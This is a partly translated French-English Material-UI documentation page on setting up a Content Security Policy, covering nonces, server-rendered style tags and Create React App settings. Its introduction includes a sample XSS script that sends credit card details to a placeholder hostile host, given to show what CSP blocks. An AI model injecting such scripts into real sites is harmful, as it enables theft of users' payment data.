# Politique de sécurité du contenu (CSP)

<p class="description">Cette section couvre les détails de la mise en place d'un CSP.</p>

## Qu'est-ce que le CSP et en quoi est-ce utile ?

CSP atténue les attaques de scripts intersites (XSS) en obligeant les développeurs à mettre sur liste blanche les sources à partir desquelles leurs actifs sont récupérés. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à `https://example.com` l'en-tête CSP `default-src: 'self';` autorisera toutes les requêtes à destination de `https://example.com/*` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

Cette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## Comment met-on en place un CSP?

### Rendu côté serveur (SSR)

Pour utiliser CSP avec Material-UI (et JSS), vous devez utiliser un nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS a un [ excellent tutoriel ](https://github.com/cssinjs/jss/blob/master/docs/csp.md) comment y parvenir avec Express et React Helmet. Pour un aperçu de base, continuez à lire.

Un nonce CSP est une chaîne codée en Base 64. Vous pouvez en générer un comme ceci:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

Vous devez utiliser l'UUID version 4, car il génère une chaîne **imprévisible**. Vous appliquez ensuite ce nonce à l'en-tête CSP. Un en-tête CSP pourrait ressembler à ceci avec le nonce appliqué:

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src: 'self' 'nonce-${nonce}';`,
);
```

Vous devez passer le nonce dans la balise `<style>` sur le serveur.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{
    __html: sheets.toString(),
  }}
/>
```

Ensuite, vous devez transmettre ce nonce à JSS afin qu’il puisse l’ajouter aux balises `<style>` suivantes.

The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.

Here is an example of what a fictional header could look like:

```html
<head>
  <meta property="csp-nonce" content="this-is-a-nonce-123" />
</head>
```

### Créer une application React (CRA)

Selon les [Create React App Docs](https://create-react-app.dev/docs/advanced-configuration/), une Create React App intégrera dynamiquement le script d'exécution dans index.html lors de la génération de production par défaut. Cela nécessitera la définition d'un nouveau hachage dans votre CSP lors de chaque déploiement.

Pour utiliser un CSP avec un projet initialisé en tant qu'application Create React, vous devrez définir la variable `INLINE_RUNTIME_CHUNK=false` dans le fichier `.env` utilisé pour votre build de production. Cela importera le script d'exécution comme d'habitude au lieu de l'incorporer, évitant ainsi d'avoir à définir un nouveau hachage lors de chaque déploiement.
